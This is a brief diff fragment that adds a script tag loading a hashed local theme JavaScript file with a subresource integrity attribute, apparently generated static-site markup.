+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
     
         
         <script
